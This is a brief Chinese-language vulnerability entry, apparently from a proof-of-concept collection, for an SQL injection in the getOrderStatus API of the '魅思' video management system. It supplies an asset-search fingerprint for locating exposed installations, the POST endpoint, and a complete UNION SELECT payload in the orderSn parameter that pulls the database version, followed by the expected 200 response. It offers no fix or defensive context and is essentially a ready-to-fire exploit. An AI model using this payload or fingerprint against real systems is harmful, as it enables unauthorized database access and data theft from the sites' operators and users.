# 魅思-视频管理系统getOrderStatusSQL注入漏洞

魅思-视频管理系统getOrderStatus ｜ SQL注入 ｜ —
- **指纹**：`app="魅思-视频管理系统"`
- **请求**：`POST /api/getOrderStatus HTTP/1.1`

**Payload**
```
orderSn=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(VERSION() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -
```
- **响应特征**：200